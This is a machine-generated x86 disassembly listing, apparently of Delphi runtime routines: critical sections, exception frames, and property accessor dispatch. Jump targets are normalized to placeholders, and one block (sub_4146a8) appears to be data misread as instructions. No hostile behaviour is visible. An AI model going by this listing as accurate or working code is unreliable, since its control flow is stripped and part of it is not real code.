pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
sub_414264
push ebx
push esi
push edi
push ebp
push ecx
mov esi ecx
mov edi edx
mov ebx eax
mov ecx esp
mov edx esi
mov eax ebx
mov ebp [ eax ]
call [ ebp + 0xc ]
test al al
je r-xdata
mov eax ebx
call sub_41434c
mov ax [ esp ]
push eax
mov ecx esi
mov edx edi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x1c ]
jmp r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
sub_4142a0
push ebp
mov ebp esp
add esp 0xfffffff8
call sub_40355c
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
push rw-data
call EnterCriticalSection
xor edx edx
push ebp
push sub_414303
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
mov ax [ eax + 0x4 ]
test ax ax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41430a
push rw-data
call LeaveCriticalSection
retn
movzx eax ax
mov edx [ rw-data ]
mov ecx [ rw-data ]
mov [ edx + eax * 4 - 0x400 ] ecx
sub_4143a4
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
mov ecx [ ebp + 0x10 ]
mov edx [ ebp + 0xc ]
mov eax ebx
call sub_403244
test al al
je r-xdata
mov eax 0x80004002
xor eax eax
jmp r-xdata
pop ebx
pop ebp
retn 0xc
sub_4143cc
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi edx
mov ebx eax
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
cmp bx 0x100
jb r-xdata
mov [ ebp - 0x1 ] al
cmp [ ebp - 0x1 ] 0x0
je r-xdata
cmp bx 0x7ff
jbe r-xdata
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
push rw-data
call EnterCriticalSection
xor eax eax
push ebp
push sub_414474
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ rw-data ]
call sub_404f18
movzx edi bx
mov edx edi
sub edx 0x100
cmp eax edx
setg [ ebp - 0x1 ]
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov al 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
push rw-data
call LeaveCriticalSection
retn
mov eax [ rw-data ]
mov eax [ eax + edi * 4 - 0x400 ]
mov [ esi ] eax
cmp [ esi ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ esi ]
cmp eax [ rw-data ]
jne r-xdata
mov [ ebp - 0x1 ] al
mov al 0x1
sub_414484
push ebp
mov ebp esp
add esp 0xfffffef0
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41455a
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x9 ] 0x0
push rw-data
call EnterCriticalSection
xor eax eax
push ebp
push sub_41453d
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ rw-data ]
call sub_404f20
mov esi eax
test esi esi
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_414544
push rw-data
call LeaveCriticalSection
retn
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
cmp ebx [ rw-data ]
je r-xdata
mov eax [ rw-data ]
mov ebx [ eax + edi * 4 ]
test ebx ebx
je r-xdata
lea edx [ ebp - 0x110 ]
mov eax [ ebx ]
call sub_4030e0
lea edx [ ebp - 0x110 ]
lea eax [ ebp - 0x10 ]
call sub_404184
mov eax [ ebp - 0x10 ]
mov edx [ ebp - 0x4 ]
call sub_407e20
test al al
je r-xdata
mov eax [ ebp - 0x8 ]
mov [ eax ] ebx
mov [ ebp - 0x9 ] 0x1
jmp r-xdata
sub_414584
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_4145f3
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4145fa
retn
call sub_414128
push rw-data
call DeleteCriticalSection
mov eax rw-data
mov edx [ r-xdata ]
call sub_4050e0
mov eax rw-data
mov ecx 0x15
mov edx [ r-xdata ]
call sub_40499c
mov eax rw-data
call sub_403f20
mov eax rw-data
call sub_40eecc
sub_4145fc
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_41469d
push [ fs : eax ]
mov [ fs : eax ] esp
sub [ rw-data ] 0x1
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4146a4
retn
mov eax rw-data
call sub_414084
mov eax sub_40ebcc
mov [ rw-data ] eax
mov eax sub_40e71c
mov [ rw-data ] eax
mov edx sub_40e62c
mov [ rw-data ] edx
mov [ rw-data ] eax
mov eax sub_40eecc
mov edx [ rw-data ]
mov [ edx ] eax
mov eax sub_413c78
mov edx [ rw-data ]
mov [ edx ] eax
mov eax sub_40f1e0
mov edx [ rw-data ]
mov [ edx ] eax
mov eax sub_4121d0
mov edx [ rw-data ]
mov [ edx ] eax
mov eax sub_4128f8
mov edx [ rw-data ]
mov [ edx ] eax
push rw-data
call InitializeCriticalSection
sub_4146a8
out 0x47 al
add [ edi + 0x640000ff ] ch
out 0x47 al
add [ eax + 0x640000ff ] dl
out 0x47 al
add [ ecx + 0x640000ff ] dl
out 0x47 al
add [ edx + 0x640000ff ] dl
out 0x47 al
add [ ebx + 0x640000ff ] dl
out 0x47 al
add [ edi + edi * 8 - 0x199c0000 ] dl
inc edi
add [ ebp + 0x640000ff ] dl
out 0x47 al
add [ esi + 0x640000ff ] dl
out 0x47 al
add [ edi + 0x640000ff ] dl
out 0x47 al
add [ eax + 0x640000ff ] bl
out 0x47 al
add [ ecx + 0x640000ff ] bl
out 0x47 al
add [ edx + 0x640000ff ] bl
out 0x47 al
add [ ebx + 0x640000ff ] bl
out 0x47 al
add [ edi + edi * 8 - 0x199c0000 ] bl
inc edi
add [ ebp + 0x640000ff ] bl
out 0x47 al
add [ esi + 0x640000ff ] bl
out 0x47 al
add [ edi + 0x640000ff ] bl
out 0x47 al
add [ eax + 0x640000ff ] al
out 0x47 al
add [ ecx + 0x640000ff ] al
out 0x47 al
add [ edx + 0x640000ff ] al
out 0x47 al
add [ ebx + 0x640000ff ] al
out 0x47 al
add [ edi + edi * 8 - 0x199c0000 ] al
inc edi
add [ ebp + 0x640000ff ] al
out 0x47 al
add [ esi + 0x640000ff ] al
out 0x47 al
add [ edi + 0x640000ff ] al
out 0x47 al
add [ eax + 0x640000ff ] cl
out 0x47 al
add [ ecx + 0x640000ff ] cl
out 0x47 al
add [ edx + 0x640000ff ] cl
out 0x47 al
add [ ebx + 0x640000ff ] cl
out 0x47 al
add [ edi + edi * 8 - 0x74ab0000 ] cl
in al dx
xor eax eax
push ebp
push sub_4147bd
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4147c4
retn
sub_414808
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi ecx
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_4148c6
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ esi ] 0x1
jne r-xdata
mov eax esi
call sub_4147fc
mov eax [ eax + 0x9 ]
mov eax [ eax ]
call sub_4147fc
cmp esi [ r-xdata ]
je r-xdata
mov edx edi
mov eax ebx
call sub_408054
jmp r-xdata
mov eax edi
test ebx ebx
setne dl
and edx 0x7f
mov edx [ edx * 4 + rw-data ]
call sub_403f74
mov eax [ rw-data ]
mov eax [ eax ]
mov edx r-xdata
call sub_407e20
test al al
je r-xdata
cmp [ eax + 0x1 ] 0x0
jge r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4148cd
lea eax [ ebp - 0x4 ]
call sub_403f20
retn
lea edx [ ebp - 0x4 ]
mov eax [ edi ]
call sub_407d40
mov edx [ ebp - 0x4 ]
mov eax edi
call sub_403f74
jmp r-xdata
lea esi [ eax + 0xd ]
test ebx ebx
je r-xdata
mov eax edi
mov edx esi
call sub_404184
xor eax eax
mov al [ esi ]
inc eax
add esi eax
dec ebx
test ebx ebx
jne r-xdata
sub_4148e0
push ebx
push esi
push edi
test edx edx
je r-xdata
or eax 0xffffffff
xor ecx ecx
mov cl [ eax + 0x1 ]
mov eax [ eax + ecx + 0xb ]
mov eax [ eax ]
mov cl [ eax + 0x1 ]
lea esi [ eax + ecx + 0xf ]
mov edi [ eax + ecx + 0x7 ]
xor eax eax
inc eax
lea esi [ ecx + esi + 0x1 ]
cmp eax edi
jle r-xdata
mov bl [ ecx + edx - 0x1 ]
xor bl [ ecx + esi ]
test bl 0xdf
jne r-xdata
mov cl [ esi ]
cmp ecx [ edx - 0x4 ]
jne r-xdata
mov cl [ esi ]
dec ecx
jne r-xdata
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_41492c
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx ] 0x1
jne r-xdata
mov eax ebx
call sub_4147fc
cmp [ eax + 0x1 ] 0x0
jge r-xdata
mov eax esi
call sub_408190
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
call sub_4148e0
mov edx [ rw-data ]
mov eax esi
call sub_407e20
test al al
je r-xdata
mov edx [ rw-data ]
mov eax esi
call sub_407e20
test al al
je r-xdata
xor eax eax
jmp r-xdata
mov eax esi
call sub_408190
jmp r-xdata
or eax 0xffffffff
jmp r-xdata
pop esi
pop ebx
retn
sub_414990
push ebx
push esi
push edi
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
mov ecx edx
or edx edx
je r-xdata
xor ebx ebx
mov bl [ eax + 0x1 ]
lea esi [ eax + ebx + 0x2 ]
mov bl [ esi + 0xa ]
movzx edi [ esi + ebx + 0xb ]
test edi edi
je r-xdata
mov cl [ edx - 0x4 ]
mov ch [ edx ]
and ecx 0xdfff
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
lea eax [ esi + ebx + 0xd ]
mov eax [ eax ]
jmp r-xdata
mov bh 0x0
mov bh 0x0
dec edi
lea eax [ eax + ebx + 0x1b ]
jne r-xdata
mov ch [ edx ]
and ch 0xdf
mov bl [ eax + 0x1a ]
jmp r-xdata
dec ebx
jne r-xdata
mov bx [ eax + 0x1a ]
and bh 0xdf
cmp ebx ecx
je r-xdata
mov ch [ ebx + edx - 0x1 ]
xor ch [ eax + ebx + 0x1a ]
test ch 0xdf
jne r-xdata
sub_414a00
push ebx
push esi
push edi
xor ecx ecx
mov esi eax
mov cl [ eax + 0x1 ]
mov edi edx
xor eax eax
movzx ecx [ esi + ecx + 0xa ]
[ edi ]
mov esi [ esi + 0x4 ]
xor ecx ecx
test esi esi
je r-xdata
lea edi [ esi + ecx + 0xd ]
pop edi
pop esi
pop ebx
retn
mov esi [ esi ]
jmp r-xdata
lea edi [ edi + ecx + 0x1b ]
dec eax
jne r-xdata
mov [ edx + ebx * 4 ] edi
mov cl [ esi + 0x1 ]
lea esi [ esi + ecx + 0x2 ]
mov cl [ esi + 0xa ]
movzx eax [ esi + ecx + 0xb ]
test eax eax
je r-xdata
movzx ebx [ edi + 0x18 ]
mov cl [ edi + 0x1a ]
cmp [ edx + ebx * 4 ] 0x0
jne r-xdata
sub_414a54
mov ecx [ edx + 0xc ]
test ecx 0xffffff00
je r-xdata
mov al cl
retn
cmp [ edx + 0xf ] 0xfe
mov edx [ edx + 0x10 ]
jb r-xdata
call ecx
retn
ja r-xdata
and ecx 0xffffff
mov cl [ ecx + eax ]
movsx ecx cx
add ecx [ eax ]
call [ ecx ]
retn
sub_414a84
push ebx
push edi
mov edi [ edx ]
mov edi [ edi ]
mov bl 0x4
cmp [ edi ] 0x7
je r-xdata
mov ecx [ edx + 0x4 ]
cmp [ edx + 0x7 ] 0xfe
mov edx [ edx + 0x10 ]
jb r-xdata
xor ecx ecx
mov cl [ edi + 0x1 ]
mov bl [ edi + ecx + 0x2 ]
call ecx
jmp r-xdata
ja r-xdata
cmp bl 0x4
jae r-xdata
and ecx 0xffffff
add ecx eax
mov al [ ecx ]
cmp bl 0x2
jb r-xdata
movsx ecx cx
add ecx [ eax ]
call [ ecx ]
jmp r-xdata
pop edi
pop ebx
retn
cmp bl 0x2
jae r-xdata
mov ax [ ecx ]
cmp bl 0x4
jb r-xdata
movsx eax ax
je r-xdata
cmp bl 0x0
movsx eax al
je r-xdata
mov eax [ ecx ]
and eax 0xffff
and eax 0xff
pop edi
pop ebx
retn
sub_414af8
push ebx
push esi
push edi
mov edi edx
mov esi [ edi ]
mov esi [ esi ]
mov bl 0x4
cmp [ esi ] 0x7
je r-xdata
mov edx [ edi + 0x10 ]
cmp edx 0x80000000
jne r-xdata
xor ebx ebx
mov bl [ esi + 0x1 ]
mov bl [ esi + ebx + 0x2 ]
mov esi [ edi + 0x8 ]
cmp [ edi + 0xb ] 0xfe
ja r-xdata
mov edx ecx
and esi 0xffffff
add eax esi
mov [ eax ] cl
cmp bl 0x2
jb r-xdata
jb r-xdata
pop edi
pop esi
pop ebx
retn
mov [ eax ] cx
cmp bl 0x4
jb r-xdata
call esi
jmp r-xdata
movsx esi si
add esi [ eax ]
call [ esi ]
jmp r-xdata
mov [ eax ] ecx
sub_414b54
push ebp
mov ebp esp
push esi
push edi
mov edi edx
mov edx [ edi + 0x10 ]
cmp edx 0x80000000
jne r-xdata
mov esi [ edi + 0x4 ]
cmp [ edi + 0x7 ] 0xfe
ja r-xdata
mov edx ecx
and esi 0xffffff
add esi eax
mov edi ecx
xor ecx ecx
mov cl [ esi ]
inc ecx
[ edi ] [ esi ]
jb r-xdata
call esi
jmp r-xdata
movsx esi si
add esi [ eax ]
call [ esi ]
jmp r-xdata
pop edi
pop esi
pop ebp
retn 0x4
sub_414b98
push esi
push edi
mov esi edx
mov edx [ esi + 0x10 ]
cmp edx 0x80000000
jne r-xdata
mov edi [ esi + 0x8 ]
cmp [ esi + 0xb ] 0xfe
ja r-xdata
mov edx ecx
and edi 0xffffff
add edi eax
mov eax [ esi ]
mov eax [ eax ]
mov esi ecx
xor ecx ecx
mov cl [ eax + 0x1 ]
mov cl [ eax + ecx + 0x2 ]
lodsb [ esi ]
cmp al cl
jb r-xdata
jb r-xdata
stosb [ edi ]
mov cl al
[ edi ] [ esi ]
pop edi
pop esi
retn
mov al cl
call edi
pop edi
pop esi
retn
movsx edi di
add edi [ eax ]
call [ edi ]
pop edi
pop esi
retn
sub_414c14
push ebx
push esi
push edi
add esp 0xffffff00
mov edi ecx
mov esi edx
mov ebx eax
mov eax esp
mov edx edi
mov ecx 0xff
call sub_4041bc
mov ecx esp
mov edx esi
mov eax ebx
call sub_414b98
add esp 0x100
pop edi
pop esi
pop ebx
retn
sub_414c5c
push esi
push edi
mov edi edx
mov edx [ edi + 0x10 ]
cmp edx 0x80000000
jne r-xdata
mov esi [ edi + 0x4 ]
cmp [ edi + 0x7 ] 0xfe
ja r-xdata
mov edx ecx
and esi 0xffffff
mov edx [ esi + eax ]
mov eax ecx
call sub_414c48
pop edi
pop esi
retn
jb r-xdata
call esi
pop edi
pop esi
retn
movsx esi si
add esi [ eax ]
call [ esi ]
pop edi
pop esi
retn
sub_414c9c
push esi
push edi
mov esi edx
mov edx [ esi + 0x10 ]
cmp edx 0x80000000
jne r-xdata
mov edi [ esi + 0x8 ]
cmp [ esi + 0xb ] 0xfe
ja r-xdata
mov edx ecx
and edi 0xffffff
add eax edi
mov edx ecx
call sub_414c48
pop edi
pop esi
retn
jb r-xdata
call edi
pop edi
pop esi
retn
movsx edi di
add edi [ eax ]
call [ edi ]
pop edi
pop esi
retn
sub_414cdc
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_414d24
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x4 ]
mov edx esi
mov eax ebx
call sub_414df8
mov edx [ ebp - 0x4 ]
mov eax edi
call sub_4041a8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_414d2b
lea eax [ ebp - 0x4 ]
call sub_404600
retn
sub_414d34
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_414d7c
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
mov edx edi
call sub_40474c
mov ecx [ ebp - 0x4 ]
mov edx esi
mov eax ebx
call sub_414ee0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_414d83
lea eax [ ebp - 0x4 ]
call sub_404600
retn
sub_414d8c
push ebx
mov ebx ecx
mov ecx [ edx ]
mov ecx [ ecx ]
mov cl [ ecx ]
sub cl 0x5
je r-xdata
mov ecx ebx
call sub_414bec
pop ebx
retn
sub cl 0x5
je r-xdata
mov ecx ebx
call sub_414c5c
pop ebx
retn
dec cl
je r-xdata
mov ecx ebx
call sub_414cdc
pop ebx
retn
jmp r-xdata
mov eax ebx
call sub_403f20
pop ebx
retn
sub_414dcc
push ebx
mov ebx [ edx ]
mov ebx [ ebx ]
mov bl [ ebx ]
sub bl 0x5
je r-xdata
call sub_414c14
pop ebx
retn
sub bl 0x5
je r-xdata
call sub_414c9c
pop ebx
retn
dec bl
je r-xdata
call sub_414d34
jmp r-xdata
pop ebx
retn
sub_414df8
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
xor ebx ebx
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_414ed0
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx ]
mov eax [ eax ]
mov al [ eax ]
sub al 0x5
je r-xdata
lea ecx [ ebp - 0x10 ]
mov edx ebx
mov eax esi
call sub_414d8c
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_40474c
jmp r-xdata
sub al 0x5
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_414ed7
lea eax [ ebp - 0x10 ]
call sub_403f20
retn
dec al
je r-xdata
mov eax [ ebx + 0x4 ]
mov edx eax
and edx 0xff000000
cmp edx 0xff000000
jne r-xdata
jmp r-xdata
cmp edx 0xfe000000
jne r-xdata
mov ebx eax
and ebx 0xffffff
add ebx esi
mov eax [ ebp - 0x4 ]
mov edx [ ebx ]
call sub_40463c
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_404600
mov [ ebp - 0xc ] eax
mov edx [ esi ]
movsx eax ax
add edx eax
mov eax [ edx ]
mov [ ebp - 0xc ] eax
jmp r-xdata
mov ecx [ ebp - 0x4 ]
mov edx esi
mov eax [ ebp - 0x8 ]
call [ ebp - 0xc ]
jmp r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call [ ebp - 0xc ]
jmp r-xdata
mov [ ebp - 0x8 ] esi
mov esi [ ebx + 0x10 ]
cmp esi 0x80000000
jne r-xdata
sub_414ee0
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0xc ] ebx
mov edi ecx
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_414fa6
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx ]
mov eax [ eax ]
mov al [ eax ]
sub al 0x5
je r-xdata
lea eax [ ebp - 0xc ]
mov edx edi
call sub_4041a8
mov ecx [ ebp - 0xc ]
mov edx ebx
mov eax esi
call sub_414dcc
jmp r-xdata
sub al 0x5
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_414fad
lea eax [ ebp - 0xc ]
call sub_403f20
retn
dec al
je r-xdata
mov eax [ ebx + 0x8 ]
mov edx eax
and edx 0xff000000
cmp edx 0xff000000
jne r-xdata
jmp r-xdata
cmp edx 0xfe000000
jne r-xdata
mov ebx eax
and ebx 0xffffff
add ebx esi
mov eax ebx
mov edx edi
call sub_40463c
jmp r-xdata
mov [ ebp - 0x8 ] eax
mov edx [ esi ]
movsx eax ax
add edx eax
mov eax [ edx ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov ecx edi
mov edx eax
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
mov edx edi
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
mov [ ebp - 0x4 ] esi
mov eax [ ebx + 0x10 ]
cmp eax 0x80000000
jne r-xdata
sub_414fb4
push ebx
push esi
add esp 0xffffffec
mov ebx edx
mov edx [ ebx + 0x4 ]
mov ecx edx
and ecx 0xff000000
cmp ecx 0xff000000
jne r-xdata
cmp ecx 0xfe000000
jne r-xdata
mov esi edx
and esi 0xffffff
add esi eax
mov eax [ ebx ]
mov eax [ eax ]
call sub_4147fc
movzx eax [ eax ]
cmp eax 0x4
ja r-xdata
mov [ esp + 0xc ] edx
mov ecx [ eax ]
movsx edx dx
add ecx edx
mov edx [ ecx ]
mov [ esp + 0xc ] edx
jmp r-xdata
xor eax eax
mov [ esp ] eax
mov [ esp + 0x4 ] eax
mov [ esp + 0x8 ] ax
jmp r-xdata
jmp [ eax * 4 + jump_table_414ff4 ]
mov edx eax
mov eax [ esp + 0x10 ]
call [ esp + 0xc ]
fstp [ esp ]
fwait
mov eax [ esp + 0x10 ]
call [ esp + 0xc ]
fstp [ esp ]
fwait
jmp r-xdata
mov [ esp + 0x10 ] eax
mov eax [ ebx + 0x10 ]
cmp eax 0x80000000
jne r-xdata
fld [ esp ]
add esp 0x14
pop esi
pop ebx
retn
fld [ esi ]
fstp [ esp ]
fwait
jmp r-xdata
fld [ esi ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ esi ]
mov [ esp ] eax
mov eax [ esi + 0x4 ]
mov [ esp + 0x4 ] eax
mov ax [ esi + 0x8 ]
mov [ esp + 0x8 ] ax
jmp r-xdata
fild [ esi ]
fstp [ esp ]
fwait
jmp r-xdata
fild [ esi ]
fdiv [ r-xdata ]
fstp [ esp ]
fwait
jmp r-xdata
fld [ esp ]
fdiv [ r-xdata ]
fstp [ esp ]
fwait
mov eax [ ebx ]
mov eax [ eax ]
call sub_4147fc
cmp [ eax ] 0x4
jne r-xdata
sub_4150cc
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov esi edx
mov edi eax
mov ebx [ esi + 0x8 ]
mov eax [ esi ]
mov eax [ eax ]
call sub_4147fc
mov al [ eax ]
mov edx ebx
and edx 0xff000000
cmp edx 0xff000000
jne r-xdata
cmp edx 0xfe000000
jne r-xdata
mov edx ebx
and edx 0xffffff
add edx edi
and eax 0x7f
cmp eax 0x4
ja r-xdata
mov [ ebp - 0x8 ] ebx
mov edx [ edi ]
movsx ecx bx
add edx ecx
mov edx [ edx ]
mov [ ebp - 0x8 ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0xc
jmp [ eax * 4 + jump_table_415114 ]
and eax 0x7f
cmp eax 0x4
ja r-xdata
and eax 0x7f
cmp eax 0x4
ja r-xdata
mov [ ebp - 0x4 ] edi
mov edx [ esi + 0x10 ]
cmp edx 0x80000000
jne r-xdata
fld [ ebp + 0x8 ]
fstp [ edx ]
fwait
jmp r-xdata
fld [ ebp + 0x8 ]
fstp [ edx ]
fwait
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov [ edx ] eax
mov eax [ ebp + 0xc ]
mov [ edx + 0x4 ] eax
mov ax [ ebp + 0x10 ]
mov [ edx + 0x8 ] ax
jmp r-xdata
fld [ ebp + 0x8 ]
fistp [ edx ]
fwait
jmp r-xdata
fld [ ebp + 0x8 ]
fmul [ r-xdata ]
fistp [ edx ]
fwait
jmp r-xdata
jmp [ eax * 4 + jump_table_415243 ]
jmp [ eax * 4 + jump_table_4151b0 ]
fld [ ebp + 0x8 ]
add esp 0xfffffffc
fstp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
fld [ ebp + 0x8 ]
add esp 0xfffffff8
fstp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
mov ax [ ebp + 0x10 ]
push eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
fld [ ebp + 0x8 ]
add esp 0xfffffff8
fistp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
fld [ ebp + 0x8 ]
fmul [ r-xdata ]
add esp 0xfffffff8
fistp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
fld [ ebp + 0x8 ]
add esp 0xfffffffc
fstp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
fld [ ebp + 0x8 ]
add esp 0xfffffff8
fstp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
mov ax [ ebp + 0x10 ]
push eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
fld [ ebp + 0x8 ]
add esp 0xfffffff8
fistp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
fld [ ebp + 0x8 ]
fmul [ r-xdata ]
add esp 0xfffffff8
fistp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
sub_4152d8
push esi
push edi
mov edi edx
mov edx [ edi + 0x10 ]
cmp edx 0x80000000
jne r-xdata
mov esi [ edi + 0x4 ]
cmp [ edi + 0x7 ] 0xfe
ja r-xdata
mov edx ecx
and esi 0xffffff
lea edx [ esi + eax ]
mov eax ecx
call sub_4152c4
pop edi
pop esi
retn
jb r-xdata
call esi
pop edi
pop esi
retn
movsx esi si
add esi [ eax ]
call [ esi ]
pop edi
pop esi
retn
sub_415318
push esi
push edi
mov esi edx
mov edx [ esi + 0x10 ]
cmp edx 0x80000000
jne r-xdata
mov edi [ esi + 0x8 ]
cmp [ esi + 0xb ] 0xfe
ja r-xdata
mov edx ecx
and edi 0xffffff
add eax edi
mov edx ecx
call sub_4152c4
pop edi
pop esi
retn
jb r-xdata
call edi
pop edi
pop esi
retn
movsx edi di
add edi [ eax ]
call [ edi ]
pop edi
pop esi
retn
sub_415358
push ebx
push esi
mov esi edx
mov edx [ esi + 0x10 ]
cmp edx 0x80000000
jne r-xdata
mov ebx [ esi + 0x4 ]
cmp [ esi + 0x7 ] 0xfe
ja r-xdata
mov edx ecx
and ebx 0xffffff
add eax ebx
mov edx [ eax ]
mov ebx [ eax + 0x4 ]
mov [ ecx ] edx
mov [ ecx + 0x4 ] ebx
pop esi
pop ebx
retn
jb r-xdata
call ebx
pop esi
pop ebx
retn
movsx ebx bx
add ebx [ eax ]
call [ ebx ]
pop esi
pop ebx
retn
sub_415398
push ebx
mov ebx [ edx + 0x8 ]
cmp [ edx + 0xb ] 0xfe
ja r-xdata
and ebx 0xffffff
add eax ebx
mov edx [ ecx ]
mov ebx [ ecx + 0x4 ]
mov [ eax ] edx
mov [ eax + 0x4 ] ebx
pop ebx
retn
mov edx [ edx + 0x10 ]
push [ ecx + 0x4 ]
push [ ecx ]
jb r-xdata
call ebx
pop ebx
retn
movsx ebx bx
add ebx [ eax ]
call [ ebx ]
pop ebx
retn
sub_4153d0
cmp [ edx + 0x7 ] 0xfe
mov ecx [ edx + 0x4 ]
mov edx [ edx + 0x10 ]
ja r-xdata
and ecx 0xffffff
add eax ecx
mov edx [ eax + 0x4 ]
mov eax [ eax ]
retn
jb r-xdata
call ecx
retn
movsx ecx cx
add ecx [ eax ]
call [ ecx ]
retn
sub_4153f8
push ebp
mov ebp esp
cmp [ edx + 0xb ] 0xfe
mov ecx [ edx + 0x8 ]
ja r-xdata
and ecx 0xffffff
add eax ecx
mov edx [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
mov [ eax ] edx
mov [ eax + 0x4 ] ecx
mov edx [ edx + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
jb r-xdata
call ecx
jmp r-xdata
movsx ecx cx
add ecx [ eax ]
call [ ecx ]
jmp r-xdata
pop ebp
retn 0x8
sub_415434
push ebx
push esi
add esp 0xfffffff4
mov [ esp ] ecx
mov ebx edx
mov edx [ ebx + 0x4 ]
mov ecx edx
and ecx 0xff000000
cmp ecx 0xff000000
jne r-xdata
cmp ecx 0xfe000000
jne r-xdata
mov ebx edx
and ebx 0xffffff
add ebx eax
mov eax [ esp ]
mov edx [ ebx ]
call sub_4057a4
jmp r-xdata
mov [ esp + 0x4 ] edx
mov ecx [ eax ]
movsx edx dx
add ecx edx
mov edx [ ecx ]
mov [ esp + 0x4 ] edx
jmp r-xdata
add esp 0xc
pop esi
pop ebx
retn
mov ecx [ esp ]
mov edx esi
mov eax [ esp + 0x8 ]
call [ esp + 0x4 ]
mov edx [ esp ]
mov eax [ esp + 0x8 ]
call [ esp + 0x4 ]
jmp r-xdata
mov [ esp + 0x8 ] eax
mov esi [ ebx + 0x10 ]
cmp esi 0x80000000
jne r-xdata
sub_4154b4
push ebx
push esi
add esp 0xfffffff8
mov esi ecx
mov ecx [ edx + 0x8 ]
mov ebx ecx
and ebx 0xff000000
cmp ebx 0xff000000
jne r-xdata
